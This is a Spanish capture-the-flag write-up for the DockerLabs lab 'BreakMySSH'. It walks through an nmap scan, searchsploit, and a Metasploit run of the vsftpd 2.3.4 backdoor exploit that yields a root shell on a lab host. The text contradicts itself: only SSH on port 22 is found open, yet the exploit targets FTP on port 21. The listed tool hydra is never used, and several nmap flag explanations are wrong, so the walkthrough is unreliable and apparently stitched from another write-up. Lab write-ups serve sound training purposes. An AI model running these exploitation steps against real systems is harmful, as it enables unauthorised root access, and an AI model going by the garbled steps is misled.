# BreakMySSH
**Herramientas y recursos usados**
- nmap
- searchsploit
- hydra

# Enumeración

Empezamos con un escaneo de los puertos.

`sudo nmap -p- --open -sC -sS -sV --min-rate=5000 -n -Pn -vvv 172.17.0.2 -oN BreakMySSH`

- `-p-` : Todos los puertos
- `--open` : Todos los puertos abiertos
- `-sC` : Escaneo de todos los scripts
- `-sS` : Escaneo de todos los servicios
- `-sV` : Escaneo de todas las versiones de los servicios
- `--min-rate 5000` : Establece mínimo envío de paquetes mínimos 5000/s
- `-n` : No aplica resolución DNS
- `-Pn` : Omisión de detección de hosts
- `-vvv` : Verbose - Muestra toda la información

# Resultado escaneo
![BMS_1](https://github.com/giustiand/DockerLabs-Writeups/blob/main/MuyF%C3%A1cil/.images/BreakMySSH/BMS_1.jpg)  
El único puerto abierto es el 22, que corresponde al servicio SSH.
Si hacemos una rápida busqueda en Google podemos observar que la versión de OpenSSH 7.7 tiene la vulnerabilidad de "user enumeration".  
![BMS_2](https://github.com/giustiand/DockerLabs-Writeups/blob/main/MuyF%C3%A1cil/.images/BreakMySSH/BMS_2.jpg)  

`searchsploit vsftpd 2.3.4`  
```
Exploit Title                                           Path
-----------------------------------------------------------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)   unix/remote/17491.rb
-----------------------------------------------------------------------------------
```
Encontramos 2 exploits, uno con extensión .rb que podemos utilizar a través de Metasploit.  
Iniciamos Metasploit y buscamos de nuevo la vulnerabilidad encontrada anteriormente con el comando `search`.
```
msf6 > search vsftp 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```
Ahora utilizaremos el comando `use` para seleccionar este exploit.
```
msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```
Con el comando `show options` podemos ver las informaciones necesarias para ejecutar el exploit.
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic

```
En este caso solo hará falta insertar esta información:
- RPORT -> Puerto 21 (FTP) de la máquina víctima (que ya está cumplimentado)
- RHOSTS -> Dirección IP de la máquina víctima (172.17.0.2)

Para ello usaremos el comando `set`  
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```
Vemos si se han aplicado los cambios insertados:
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   172.17.0.2       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```
Por último, ejecutaremos el exploit con el comando `run`.
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
```
```
[*] 172.17.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.17.0.2:21 - USER: 331 Please specify the password.
[+] 172.17.0.2:21 - Backdoor service has been spawned, handling...
[+] 172.17.0.2:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 2 opened (172.17.0.1:38103 -> 172.17.0.2:6200) at 2024-06-16 15:59:31 -0400

id
uid=0(root) gid=0(root) groups=0(root)
```
Listo! Ya somos root!
